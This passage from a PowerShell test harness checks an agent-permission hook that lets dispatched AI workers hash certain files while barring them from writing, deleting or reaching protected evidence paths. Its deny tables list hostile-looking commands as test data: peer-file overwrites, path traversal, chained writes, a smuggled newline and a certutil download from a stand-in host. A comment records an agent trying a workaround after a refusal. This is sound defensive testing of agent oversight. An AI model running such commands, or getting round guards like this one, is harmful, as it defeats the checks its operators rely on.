# mutation, and the eight reads must still answer not-mutation. This is the regression half of a
# widening, and it is taken over H-7's rows rather than over a copy of them so the two cannot drift.
$h9CorpusBad = 0
$h9CorpusLines = New-Object System.Collections.Generic.List[string]
foreach ($r in $h7Rows) {
    $got = [bool](Test-EvidenceGateToolMutation -Command $r.cmd)
    $ok = ($got -eq [bool]$r.deny)
    if (-not $ok) { $h9CorpusBad++ }
    [void]$h9CorpusLines.Add(('      H-7 {0,-4} want={1,-5} got={2,-5} {3}   {4}' -f $r.id,
        $(if ($r.deny) { 'DENY' } else { 'ALLOW' }), $(if ($got) { 'DENY' } else { 'ALLOW' }),
        $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $r.cmd))
}
$h9CorpusReached = ($h7Rows.Count -eq 12)
$h9detail = @"
    THE DEFECT -- the gate tool's own help surface, built by amendment 33 and asserted by
    WP-4 T-24 against real output, could not be reached from the seat it was written for: -? and
    -Help are option-shaped, the positional collector skips them, the positional count is zero and
    zero positionals means "absent verb" means mutation means deny. Every admit row below returned
    exit 2 / deny at the base of this edit, for both tool names and both roles, under the
    gate-MUTATING-verb sentence. Get-Help over the file is NOT the same surface: it prints the
    comment-based help, not the per-verb text T-24 measures.
    BATCH 1 SESSION 5 (amendment 40's finding): the hook rows are driven with payload cwd at a
    scratch root outside the repository and outside every protected path, not at the checkout root,
    so a checkout standing under .claude\worktrees no longer turns the -? admit rows into a
    metacharacter-tier refusal. The rows and their expectations are unchanged.
      scratch cwd                : $h9CwdRoot   (removed afterwards: $h9CwdRemoved)
      PRECONDITION scratch cwd clean through the library's own form/hit functions: $h9CwdOk   (expect True)
        $h9CwdSentence
        probes: $($h9CwdProbes.Count) (the root + $($h9Rows.Count) rows)   forms measured: $h9CwdFormCount   protected hits: $($h9CwdProt.Count)   parent hits: $($h9CwdParent.Count)   gate forms: $($h9CwdGate.Count)   outside repo: $h9CwdOutside
      CONTROL, NOT A CONJUNCT -- row a1, seat, Bash, cwd = <scratch>\.claude\worktrees\h9ctl:
        exit=$h9CtlExit decision=$h9CtlDecision   (expected today: exit=2 deny -- the mechanism the moved cwd steps around; a later session may change this)
      admit-now rows allowed   : $h9AllowOk of $h9Allow
      still-refused rows denied: $h9DenyOk of $h9Deny
      divergences              : $h9Bad   (expect 0)
      table reached            : $h9Reached   (expect True -- 28 deny rows and 20 allow rows)
      MANDATORY DENY CONTROL d2 (the mint convention) diverged: $h9CtlBad   (expect 0)
      denial records naming mission-gate, all outcome denied  : $h9RecOk   (expect True, $h9Deny records, got $($h9Recs.Count))
      the admitted set is a CLOSED LITERAL list of two        : $h9ListOk   (expect True, got $($h9FlagSet -join ', '))
      predicate asked directly at the two lists' edge         : $h9PredOk   (expect True)
        -?                 -> $h9p1   (expect False -- THE ROW)
        -Help              -> $h9p2   (expect False -- the other closed-list member)
        no verb at all     -> $h9p3   (expect True  -- the no-verb refusal is UNCHANGED)
        -H                 -> $h9p4   (expect True  -- exact match, never a prefix)
        -He                -> $h9p5   (expect True  -- the same, one letter further)
        -MissionRoot -?    -> $h9p6   (expect True  -- the value parameter consumed it; it is an argument, not a flag)
        -? then approve    -> $h9p7   (expect True  -- a later segment with a real verb still refuses)
        list -MissionRoot .-> $h9p8   (expect False -- the one read verb, unmoved)
$($h9Lines -join ([string][char]10))
      H-7'S MINTING CORPUS RE-DRIVEN AT THIS TIP -- divergences: $h9CorpusBad   (expect 0); rows: $($h7Rows.Count) (expect 12)
$($h9CorpusLines -join ([string][char]10))
    THE DIRECTION, STATED BECAUSE IT IS THE OPPOSITE OF EVERY OTHER MEMBER HERE: this cure REMOVES
    denials. It is bounded to fire only when the segment after the tool token carries ZERO
    positional tokens AND an exact member of the closed help list, with the unreadable test having
    already run and passed. The residual it leaves open: if mission-gate.ps1 ever grows a MUTATING
    action that needs no positional verb, a command carrying that switch and a help flag would be
    admitted here. Today its whole mutating surface is a ValidateSet of positional verbs.
"@
Check -Id 'H-9' -Title "the gate tool's OWN HELP is admitted as read-only from both roles and both shell tools, while the no-verb refusal, every mutating verb, a help flag beside a verb and the unreadable branch all stay refused" `
      -Ok (($h9Bad -eq 0) -and $h9Reached -and ($h9CtlBad -eq 0) -and $h9RecOk -and $h9PredOk -and $h9ListOk -and ($h9CorpusBad -eq 0) -and $h9CorpusReached -and $h9CwdOk) -Detail $h9detail

# =============================================================================================
# H-8 -- A DISPATCHED WORKER MAY HASH A DISPATCH FACE AND A CONTRACT ARTIFACT, AND MAY STILL NOT
#        WRITE, MOVE, DELETE OR REACH THE EVIDENCE PLANE
# =============================================================================================
# THE DEFECT: "A VALIDATOR CANNOT COMPUTE THE sha256 OF THE .mission ARTIFACTS ON ITS
# OWN DISPATCH FACE -- the evidence guard refuses a dispatched worker any non-git command naming a
# .mission path, so THE PARTY ASKED TO VERIFY A BINDING IS THE ONE FORBIDDEN TO COMPUTE IT."
# Evidenced by A-579 round 2's disclosure, where the validator carried the figures UNVERIFIED and
# STOPPED when its scoped git-archive workaround was denied too, rather than route around the guard.
#
# REPRODUCED BEFORE IT WAS CURED, through this same hook: with LAM_DISPATCH set in the child only,
# the command that hashes a dispatch face returned exit 2 under the worker-plane sentence, while
# the BYTE-IDENTICAL command with LAM_DISPATCH unset returned exit 0. The seat row below is that
# control, kept because it is what makes the refusal a role rule rather than a territory rule.
#
# THIS MEMBER WIDENS A GUARD, WHICH IS THE DANGEROUS DIRECTION, so the refusal rows are the
# deliverable and the two admit rows are not. A member that asserted only the admits would pass
# against a guard that allowed everything; the table below is therefore mostly attacks, and each
# one is an attempt to reach something the exception is not allowed to reach.
#
# THE REGISTER SAYS THERE ARE THREE LINES AND NOT ONE, so three of them are asserted separately:
#   LINE 1  the worker-plane rule, which is the only line this cure touches;
#   LINE 2  A1's protected tier, which refuses the evidence plane to EVERY identity -- asserted
#           from the ORCHESTRATOR SEAT, where no worker rule can be doing the work, and on the
#           REASON STRING rather than on the exit code alone;
#   LINE 3  the metacharacter tier, asserted on a .mission/dispatches path -- the very territory
#           the exception permits -- so that a redirect into it still dies on its own sentence.
#
# AND THE A1-REACH CONTROL, WHICH IS THE ONE MOST LIKELY TO BE SKIPPED. The worker-plane rule has
# FOUR call sites, two of them inside the SEALED A1 library this build may not edit. A cure written
# at this file's shell call site would leave framework:1716 to re-deny at the delegation, and would
# then read correct and measure NOTHING. That variant was BUILT AND DRIVEN during this row: it
# returned exit 2 for the very command the cure exists to admit. Two assertions below pin it down
# permanently: the end-to-end allow (which can only happen if A1's copy did not deny), and A1's
# captured decision function invoked DIRECTLY, with its deny control alongside.
$h8Id = 'session-wp1-row161'
$h8Dir = Get-EvidenceRuntimeDir -Root $sandbox -DispatchId $h8Id
New-Item -ItemType Directory -Path $h8Dir -Force | Out-Null
$env:MISSION_DISPATCH_ID = $h8Id
$h8Disp = 'D-ROW161-WORKER'
# The plane prefixes are ASSEMBLED rather than written whole, the way H-7 assembles the gates path:
# an instrument that spells protected territory in one piece is itself refusable, and a member that
# cannot be run is a member that measures nothing.
$m8  = '.mission'
$mr8 = '.mission' + '-runtime'
$h8Own = $m8 + '/dispatches/' + $h8Disp + '.handoff.yaml'
# WHERE THE HOOK ROWS STAND: THE PRIMARY CHECKOUT, WHEREVER THIS INSTRUMENT RUNS. The guard library's
# peer-worktree rule derives the main repository root from each of its anchors (CLAUDE_PROJECT_DIR, the
# payload cwd, the library's own folder; a .git FILE is read for its gitdir), takes
# <parent-of-main-root>/<leaf>-worktrees as a worker home, and refuses a dispatched worker every path
# under a tree of that home that is not its own wt-<LAM_DISPATCH>. Run from a linked worktree at
# <parent>/<repo>-worktrees/<tree>, a payload cwd of $repoRoot put every relative token -- and n5's
# absolute spelling -- under <tree>, a PEER of this member's worker, so all nine worker admit rows were
# refused for LOCATION and for nothing this member measures. So the rows stand at the primary checkout:
# git's common dir names it when that dir ends in /.git and its parent is not $repoRoot and holds a .git
# directory (the guard library's own main-root walk answers when git answers nothing). At the primary
# checkout that is $repoRoot and nothing changes. In a linked worktree the payloads become the primary
# checkout's own, every anchor still derives the same main root, no anchor places a wt-<LAM_DISPATCH>
# tree, and the sandbox CLAUDE_PROJECT_DIR holds no .git entry in either place -- so every row is
# decided as at the root and the readings are EQUAL. Nothing is written at the primary checkout: the
# guard writes only its denial records, into the sandbox. The IN-PROCESS calls below -- A1's captured
# decision function and the predicate asked directly -- never run the peer rule and stay on $repoRoot.
$h8Cwd = $repoRoot
$h8CwdHow = 'the checkout this instrument runs in'
$h8Common = ''
$h8PrevEap = $ErrorActionPreference
$ErrorActionPreference = 'Continue'
try { $h8Common = ("$(& git -C $repoRoot rev-parse --path-format=absolute --git-common-dir 2>$null)").Trim() }
catch { $h8Common = '' }
finally { $ErrorActionPreference = $h8PrevEap }
try {
    $h8Main = ''
    $h8MainFrom = ''
    if ($h8Common) {
        $h8CommonFull = ([System.IO.Path]::GetFullPath($h8Common.Replace('/', '\'))).TrimEnd('\')
        if ([System.IO.Path]::GetFileName($h8CommonFull) -eq '.git') {
            $h8Main = [System.IO.Path]::GetDirectoryName($h8CommonFull)
            $h8MainFrom = "git names the common dir $h8Common"
        } else {
            $h8CwdHow = "the checkout this instrument runs in: git names the common dir $h8Common, which does not end in /.git, so no primary checkout is derived"
        }
    } else {
        $h8Lib = [string](Get-EvidencePeerWorktreeMainRoot -Anchor $repoRoot)
        if ($h8Lib) {
            $h8Main = ([System.IO.Path]::GetFullPath($h8Lib.Replace('/', '\'))).TrimEnd('\')
            $h8MainFrom = "git answered nothing, and the guard library's own main-root walk from this checkout names $h8Lib"
        } else {
            $h8CwdHow = "the checkout this instrument runs in: git answered nothing and the guard library's own main-root walk derived no main root"
        }
    }
    if ($h8Main) {
        $h8RootFull = ([System.IO.Path]::GetFullPath($repoRoot)).TrimEnd('\')
        if ([string]::Equals($h8Main.TrimEnd('\'), $h8RootFull, [System.StringComparison]::OrdinalIgnoreCase)) {
            $h8CwdHow = "the checkout this instrument runs in, which IS the primary checkout ($h8MainFrom)"
        } elseif ([System.IO.Directory]::Exists((Join-Path $h8Main '.git'))) {
            $h8Cwd = $h8Main
            $h8CwdHow = "the PRIMARY checkout, not the linked worktree this instrument runs in ($repoRoot): $h8MainFrom, and $h8Main holds a .git directory. Standing in the linked worktree, the peer-worktree rule would read that worktree as a PEER of this member's worker and refuse every worker row for location"
        } else {
            $h8CwdHow = "the checkout this instrument runs in: the derived main root $h8Main holds no .git directory ($h8MainFrom)"
        }
    }
} catch {
    $h8Cwd = $repoRoot
    $h8CwdHow = "the checkout this instrument runs in: deriving the primary checkout failed ($($_.Exception.Message))"
}
$h8Rows = @(
    # ---- NOW-ADMITS: the row itself. Measured DENY at the base of this edit. -----------------
    [pscustomobject]@{ id = 'n1'; deny = $false; worker = $true; tool = 'Bash';
                       why = 'THE ROW: a dispatched worker hashes a dispatch face. exit 2 at the base of this edit';
                       cmd = "sha256sum $m8/dispatches/D-PEER.yaml" }
    [pscustomobject]@{ id = 'n2'; deny = $false; worker = $true; tool = 'Bash';
                       why = 'the same for a contract artifact -- the operator order names BOTH directories';
                       cmd = "sha256sum $m8/contract/assertions/a-579.yaml" }
    [pscustomobject]@{ id = 'n3'; deny = $false; worker = $true; tool = 'Bash';
                       why = 'certutil, the in-box Windows hasher, with its single admitted flag';
                       cmd = "certutil -hashfile $m8/dispatches/D-PEER.yaml SHA256" }
    [pscustomobject]@{ id = 'n4'; deny = $false; worker = $true; tool = 'PowerShell';
                       why = 'Get-FileHash through the OTHER shell tool: the cure is not Bash-only';
                       cmd = "Get-FileHash -Algorithm SHA256 -LiteralPath $m8/contract/assertions/a-579.yaml" }
    [pscustomobject]@{ id = 'n5'; deny = $false; worker = $true; tool = 'Bash';
                       why = 'shasum with a separated algorithm argument, and an absolute spelling of the path';
                       cmd = "shasum -a 256 -b $h8Cwd/$m8/dispatches/D-PEER.yaml" }
    # ---- STILL-ADMITS: what passed before must still pass. -----------------------------------
    [pscustomobject]@{ id = 's1'; deny = $false; worker = $false; tool = 'Bash';
                       why = 'THE SEAT CONTROL: allowed at the base, must stay allowed. No regression for the orchestrator';
                       cmd = "sha256sum $m8/dispatches/D-PEER.yaml" }
    [pscustomobject]@{ id = 's2'; deny = $false; worker = $true; tool = 'Bash';
                       why = "K-3 closed member 2: the worker's OWN handoff by shell copy, which is its entire output obligation";
                       cmd = "cp handoff.yaml $h8Own" }
    [pscustomobject]@{ id = 's3'; deny = $false; worker = $true; tool = 'Bash';
                       why = 'an ordinary worker command naming no mission-plane path at all';
                       cmd = 'git status --porcelain' }
    [pscustomobject]@{ id = 's4'; deny = $false; worker = $true; tool = 'Bash';
                       why = 'a hash of an ordinary repository file: the exception did not make hashing itself suspicious';
                       cmd = 'sha256sum README.md' }
    # ---- STILL-REFUSED: every write shape into the two PERMITTED directories. ----------------
    [pscustomobject]@{ id = 'r1'; deny = $true; worker = $true; tool = 'Bash';
                       why = "THE CATASTROPHIC MISTAKE THIS ROW COULD HAVE MADE: a path-scoped cure would let a worker overwrite a PEER's handoff with a plain copy, and it is ALLOWED from the seat";
                       cmd = "cp seed.yaml $m8/dispatches/D-PEER.yaml" }
    [pscustomobject]@{ id = 'r2'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'move into the permitted directory';
                       cmd = "mv seed.yaml $m8/dispatches/D-PEER.yaml" }
    [pscustomobject]@{ id = 'r3'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'delete inside the permitted directory';
                       cmd = "rm $m8/dispatches/D-PEER.yaml" }
    [pscustomobject]@{ id = 'r4'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'copy-over into the OTHER permitted directory -- the contract plane is not write-open either';
                       cmd = "cp seed.yaml $m8/contract/assertions/a-579.yaml" }
    [pscustomobject]@{ id = 'r5'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'in-place truncation with no metacharacter -- the earlier failure shape, re-run';
                       cmd = "truncate -s 0 $m8/dispatches/D-PEER.yaml" }
    [pscustomobject]@{ id = 'r6'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'dd, whose output operand carries an equals sign: clause C4 kills that family generically';
                       cmd = "dd if=$m8/dispatches/D-PEER.yaml of=$m8/dispatches/D-COPY.yaml" }
    [pscustomobject]@{ id = 'r7'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'install, which writes and is not a hashing verb';
                       cmd = "install -m 644 seed.yaml $m8/dispatches/D-PEER.yaml" }
    [pscustomobject]@{ id = 'r8'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'tee, the writing shape that needs no redirect';
                       cmd = "tee $m8/dispatches/D-PEER.yaml" }
    # ---- STILL-REFUSED: the evidence plane, on BOTH planes, hashed. --------------------------
    [pscustomobject]@{ id = 'r9'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'THE LINE THE CURE MUST NOT CROSS: a hash of the committed evidence plane stays refused';
                       cmd = "sha256sum $m8/evidence/$h8Disp/manifest.json" }
    [pscustomobject]@{ id = 'r10'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'and the RUNTIME evidence plane, which is a different pattern in a different tier';
                       cmd = "sha256sum $mr8/evidence/$h8Disp/log.jsonl" }
    [pscustomobject]@{ id = 'r11'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'REACHING EVIDENCE THROUGH A PATH THAT ALSO NAMES DISPATCHES: it READS permitted and RESOLVES to the evidence plane';
                       cmd = "sha256sum $m8/dispatches/../evidence/$h8Disp/manifest.json" }
    [pscustomobject]@{ id = 'r12'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'the same escape from the contract root';
                       cmd = "sha256sum $m8/contract/../evidence/$h8Disp/manifest.json" }
    [pscustomobject]@{ id = 'r13'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'a traversal that escapes to a THIRD directory: the two roots are the bound, not "anything but evidence"';
                       cmd = "sha256sum $m8/dispatches/../ledger/entries.jsonl" }
    [pscustomobject]@{ id = 'r14'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'a permitted path and a forbidden one in ONE command: every path token is judged, not the first';
                       cmd = "sha256sum $m8/dispatches/a.yaml $m8/evidence/b.json" }
    # ---- STILL-REFUSED: gates, markers, and the rest of the plane. ---------------------------
    [pscustomobject]@{ id = 'r15'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'T-3 territory: a gate is unwritable for every role, and hashing one is not admitted by this exception';
                       cmd = "sha256sum $m8/gates/push-forged.yaml" }
    [pscustomobject]@{ id = 'r16'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'a supersession marker that sits INSIDE a permitted directory: the marker rule is asked by name, not assumed';
                       cmd = "sha256sum $m8/dispatches/D-OLD.superseded.yaml" }
    [pscustomobject]@{ id = 'r17'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'the ledger: the exception did not widen to the whole mission plane';
                       cmd = "sha256sum $m8/ledger/entries.jsonl" }
    [pscustomobject]@{ id = 'r18'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'a directory whose name merely STARTS with the permitted one';
                       cmd = "sha256sum $m8/dispatchesx/a.yaml" }
    [pscustomobject]@{ id = 'r19'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'the bare permitted ROOT with nothing under it -- the path clause requires a component';
                       cmd = "sha256sum $m8/contract" }
    # ---- STILL-REFUSED: chaining, metacharacters, newlines. ----------------------------------
    [pscustomobject]@{ id = 'r20'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'A SECOND COMMAND CHAINED BEHIND A PERMITTED HASH -- the shape that would turn a read into a write';
                       cmd = "sha256sum $m8/dispatches/a.yaml && cp e.yaml $m8/dispatches/a.yaml" }
    [pscustomobject]@{ id = 'r21'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'a redirect out of a permitted hash: clause C1 refuses to coexist with the metacharacter tier';
                       cmd = "sha256sum $m8/dispatches/a.yaml > leak.txt" }
    [pscustomobject]@{ id = 'r22'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'a pipe into a writer';
                       cmd = "sha256sum $m8/dispatches/a.yaml | tee $m8/dispatches/a.yaml" }
    [pscustomobject]@{ id = 'r23'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'A SMUGGLED NEWLINE, which is a segment separator that is not a metacharacter';
                       cmd = "sha256sum $m8/dispatches/a.yaml" + [string][char]10 + "cp e.yaml $m8/dispatches/a.yaml" }
    # ---- STILL-REFUSED: verbs and flags outside the closed sets. -----------------------------
    [pscustomobject]@{ id = 'r24'; deny = $true; worker = $true; tool = 'Bash';
                       why = "THE attempt-4 counterexample: sort writes with -o and carries no metacharacter";
                       cmd = "sort -o $m8/dispatches/a.yaml seed.yaml" }
    [pscustomobject]@{ id = 'r25'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'the --output= family, killed by the equals-sign clause rather than by enumeration';
                       cmd = "sha256sum --output=$m8/dispatches/a.yaml b.txt" }
    [pscustomobject]@{ id = 'r26'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'an ADMITTED verb with an unadmitted flag: certutil -f is the overwrite switch';
                       cmd = "certutil -f -hashfile $m8/dispatches/a.yaml SHA256" }
    [pscustomobject]@{ id = 'r27'; deny = $true; worker = $true; tool = 'Bash';
                       why = "certutil's download verb, the reason certutil is the riskiest inclusion in the set";
                       cmd = "certutil -urlcache -split -f http://x/y $m8/dispatches/a.yaml" }
    [pscustomobject]@{ id = 'r28'; deny = $true; worker = $true; tool = 'Bash';
                       why = '-c reads a CHECKSUM file: an admitted verb whose unadmitted flag changes what the argument means';
                       cmd = "sha256sum -c $m8/dispatches/a.yaml" }
    [pscustomobject]@{ id = 'r29'; deny = $true; worker = $true; tool = 'PowerShell';
                       why = 'Get-FileHash with a parameter outside its closed set';
                       cmd = "Get-FileHash -Path $m8/dispatches/a.yaml -OutVariable z" }
    [pscustomobject]@{ id = 'r30'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'git hash-object -w writes into the object store, and git is not in the verb set at all';
                       cmd = "git hash-object -w $m8/dispatches/a.yaml" }
    [pscustomobject]@{ id = 'r31'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'openssl dgst has -out, which writes: the excluded-verb reason, driven';
                       cmd = "openssl dgst -sha256 -out $m8/dispatches/a.yaml b.txt" }
    [pscustomobject]@{ id = 'r32'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'AN INTERPRETER IS NEVER A READ-ONLY VERB';
                       cmd = "python -c print $m8/dispatches/a.yaml" }
    [pscustomobject]@{ id = 'r33'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'AN EXECUTABLE INSIDE THE PERMITTED DIRECTORY: the exception lets a worker READ there, never RUN there';
                       cmd = "$m8/dispatches/sha256sum $m8/dispatches/a.yaml" }
    [pscustomobject]@{ id = 'r34'; deny = $true; worker = $true; tool = 'Bash';
                       why = 'a file directly under the plane ROOT: permitted means two NAMED directories, not the root. (The BARE root, with no component under it, was ALLOWED before this cure and still is -- the worker-plane pattern needs a slash and a child, and this row deliberately does not claim otherwise)';
                       cmd = "sha256sum $m8/loose.yaml" }
    # ---- STILL-REFUSED: the file-tool route, which must gain nothing. ------------------------
    [pscustomobject]@{ id = 'f1'; deny = $true; worker = $true; tool = 'Write'; file = "$m8/dispatches/D-PEER.yaml";
                       why = 'THE EXCEPTION MUST NOT LEAK ACROSS ROUTES: a file-tool argument is a bare path with no verb' }
    [pscustomobject]@{ id = 'f2'; deny = $true; worker = $true; tool = 'Write'; file = "$m8/contract/assertions/a-579.yaml";
                       why = 'the same for the contract plane' }
    [pscustomobject]@{ id = 'f3'; deny = $true; worker = $true; tool = 'Edit'; file = "$m8/dispatches/D-PEER.yaml";
                       why = 'and through the other write tool' }
    [pscustomobject]@{ id = 'f4'; deny = $false; worker = $true; tool = 'Write'; file = $h8Own;
                       why = "K-3 closed member 2 through the FILE route: the worker's own handoff still writes" }
)
$h8Lines = New-Object System.Collections.Generic.List[string]
$h8Bad = 0; $h8Deny = 0; $h8Allow = 0; $h8DenyOk = 0; $h8AllowOk = 0
foreach ($r in $h8Rows) {
    # LAM_DISPATCH IS SET IN THIS INSTRUMENT PROCESS ONLY, so the hook CHILD inherits it. It is
    # removed again after every row and after the table, because a leaked marker would make every
    # later measurement in this file a worker measurement without saying so.
    if ($r.worker) { $env:LAM_DISPATCH = $h8Disp } else { Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue }
    $ti = @{}
    if ($r.PSObject.Properties.Name -contains 'cmd' -and $r.cmd) { $ti['command'] = $r.cmd }
    if ($r.PSObject.Properties.Name -contains 'file' -and $r.file) { $ti['file_path'] = $r.file; $ti['content'] = 'x' }
    $payload = @{
        session_id      = $h8Id
        hook_event_name = 'PreToolUse'
        tool_name       = $r.tool
        tool_input      = $ti
        cwd             = $h8Cwd
    } | ConvertTo-Json -Depth 8 -Compress
    $res = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $payload
    $gotDeny = ($res.exit -eq 2) -and ($res.stdout -like '*"permissionDecision":"deny"*')
    $gotAllow = ($res.exit -eq 0) -and ($res.stdout -like '*"permissionDecision":"allow"*')
    $ok = if ($r.deny) { $gotDeny } else { $gotAllow }
    if ($r.deny) { $h8Deny++; if ($ok) { $h8DenyOk++ } } else { $h8Allow++; if ($ok) { $h8AllowOk++ } }
    if (-not $ok) { $h8Bad++ }
    $shown = if ($r.PSObject.Properties.Name -contains 'cmd' -and $r.cmd) { $r.cmd -replace [string][char]10, ' <NEWLINE> ' } else { '[' + $r.tool + '] ' + $r.file }
    [void]$h8Lines.Add(('      {0,-4} {1,-6} {2,-11} want={3,-5} exit={4} {5}   {6}' -f
        $r.id, $(if ($r.worker) { 'worker' } else { 'seat' }), $r.tool,
        $(if ($r.deny) { 'DENY' } else { 'ALLOW' }), $res.exit,
        $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $shown))
    [void]$h8Lines.Add('              ' + $r.why)
}
Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue

# LINE 2 AND LINE 3, ASSERTED ON THEIR OWN SENTENCES AND FROM THE SEAT. Exit codes alone would not
# show WHICH line refused, and a cure that quietly moved a refusal onto a layer that could later be
# narrowed would look identical. The seat is used deliberately: no worker rule can be doing this
# work, so what answers is the tier that is role-blind.
function Invoke-H8Seat {
    param([string]$Command)
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
    $p = @{ session_id = $h8Id; hook_event_name = 'PreToolUse'; tool_name = 'Bash'
            tool_input = @{ command = $Command }; cwd = $h8Cwd } | ConvertTo-Json -Depth 8 -Compress
    return (Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $p)
}
$h8L2 = Invoke-H8Seat -Command "sha256sum $m8/evidence/$h8Disp/manifest.json"
# THE JSON ESCAPES THE QUOTE CHARACTERS around the path, so the sentence is matched in two pieces
# rather than with a quote in the pattern -- a matcher that silently never fires is the false-PASS
# class this file's law 5 exists to forbid, and the first spelling of this assertion did exactly
# that until the run showed it False.
$h8L2Ok = ($h8L2.exit -eq 2) -and ($h8L2.stdout -like '*command references the protected path*') -and
          ($h8L2.stdout -like "*$m8/evidence*")
$h8L3 = Invoke-H8Seat -Command "sha256sum $m8/dispatches/D-PEER.yaml > leak.txt"
$h8L3Ok = ($h8L3.exit -eq 2) -and ($h8L3.stdout -like '*command contains a shell metacharacter AND references protected territory*')

# THE A1-REACH MEASUREMENT, TAKEN TWO WAYS BECAUSE IT IS THE LOAD-BEARING UNMEASURED CLAIM OF THIS
# CURE. A1's Get-EvidenceGuardDecision was captured as a scriptblock before this build redefined
# it, and A1's body calls Test-EvidenceWorkerPlanePath BY NAME. Invoking that captured scriptblock
# DIRECTLY is A1's own copy of the rule, executed as A1 wrote it -- and it must now answer with the
# delta's predicate. The deny control beside it is what makes the allow mean something: a captured
# function that had stopped deciding anything at all would also produce the allow.
# THE INPUT IS A PSCustomObject AND NOT A HASHTABLE, and the difference is not cosmetic: A1 reads
# the command field off the object's properties, so a hashtable makes A1 see NO command at all and
# answer allow for everything. The first spelling of this measurement did exactly that, and the
# deny control below is what caught it -- which is the whole reason a widening member carries its
# controls beside its admits.
# AND THE SCRIPT-SCOPE CWD IS SET EXPLICITLY FIRST, because H-6 above calls Get-EvidenceGuardDecision
# IN PROCESS against a temporary repository that lives under the sandbox -- which lives under
# .mission-runtime/ -- and that call leaves $script:EvidenceCwd pointing inside the mission plane
# for everything after it. That is not a test nuisance: it is the disclosed cwd behaviour of the
# predicate, measured. A hook invocation sets this variable per call, so a direct call must set it
# too or it is measuring the LAST member's working directory instead of this one's.
$h8SavedCwd = $script:EvidenceCwd
$script:EvidenceCwd = $repoRoot
$env:LAM_DISPATCH = $h8Disp
$h8A1Allow = & $script:A1_GetEvidenceGuardDecision -ToolName 'Bash' -ToolInput ([pscustomobject]@{ command = "sha256sum $m8/dispatches/D-PEER.yaml" })
$h8A1Deny  = & $script:A1_GetEvidenceGuardDecision -ToolName 'Bash' -ToolInput ([pscustomobject]@{ command = "cp seed.yaml $m8/dispatches/D-PEER.yaml" })
$h8A1EvidenceDeny = & $script:A1_GetEvidenceGuardDecision -ToolName 'Bash' -ToolInput ([pscustomobject]@{ command = "sha256sum $m8/evidence/$h8Disp/manifest.json" })
# THE CWD-SENSITIVITY ITSELF, ASSERTED RATHER THAN ONLY DESCRIBED: the same admitted command, with
# the process standing inside the plane, is REFUSED. That is the fail-closed direction and it is
# disclosed in the library docblock; measuring it here stops it from being rediscovered as a bug.
$script:EvidenceCwd = Join-Path $repoRoot ('.mission' + '-runtime')
$h8A1InPlane = & $script:A1_GetEvidenceGuardDecision -ToolName 'Bash' -ToolInput ([pscustomobject]@{ command = "sha256sum $m8/dispatches/D-PEER.yaml README.md" })
$script:EvidenceCwd = $h8SavedCwd
Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
$h8A1Ok = ($h8A1Allow.decision -ne 'deny') -and ($h8A1Deny.decision -eq 'deny') -and
          ($h8A1EvidenceDeny.decision -eq 'deny') -and ($h8A1InPlane.decision -eq 'deny')

# THE DENIAL RECORD, judged the way H-1d and H-7 judge theirs. A cure that silenced the record
# instead of the refusal would be worse than the refusal.
$h8Recs = @(Get-LogEntries -DispatchId $h8Id |
            Where-Object { [string](Get-EntryField $_ 'tool' '') -eq '_denied' })
$h8RecOk = ($h8Recs.Count -ge $h8Deny) -and
           (@($h8Recs | Where-Object { [string](Get-EntryField $_ 'outcome' '') -eq 'denied' }).Count -eq $h8Recs.Count)

# AND THE PREDICATE ASKED DIRECTLY, so the narrowing is measured rather than inferred from a
# decision several rules could have produced.
$h8p1 = [bool](Test-EvidenceReadOnlyMissionHashCommand -Text "sha256sum $m8/dispatches/a.yaml" -Cwd $repoRoot)
$h8p2 = [bool](Test-EvidenceReadOnlyMissionHashCommand -Text "sha256sum $m8/evidence/a.json" -Cwd $repoRoot)
$h8p3 = [bool](Test-EvidenceReadOnlyMissionHashCommand -Text "cp a $m8/dispatches/a.yaml" -Cwd $repoRoot)
$h8p4 = [bool](Test-EvidenceReadOnlyMissionHashCommand -Text "sha256sum" -Cwd $repoRoot)
$h8p5 = [bool](Test-EvidenceReadOnlyMissionHashCommand -Text "$m8/dispatches/a.yaml" -Cwd $repoRoot)
$h8p6 = [bool](Test-EvidenceReadOnlyMissionHashCommand -Text '' -Cwd $repoRoot)
$h8PredOk = $h8p1 -and (-not $h8p2) -and (-not $h8p3) -and (-not $h8p4) -and (-not $h8p5) -and (-not $h8p6)
# NON-VACUITY: a table that lost its rows would report zero divergences and prove nothing.
$h8Reached = ($h8Deny -eq 37) -and ($h8Allow -eq 10)
$h8detail = @"
    H-8 -- the party asked to verify a sha256 binding was the one forbidden to compute it. A
    dispatched worker's hash of a dispatch face returned exit 2 under the worker-plane sentence at
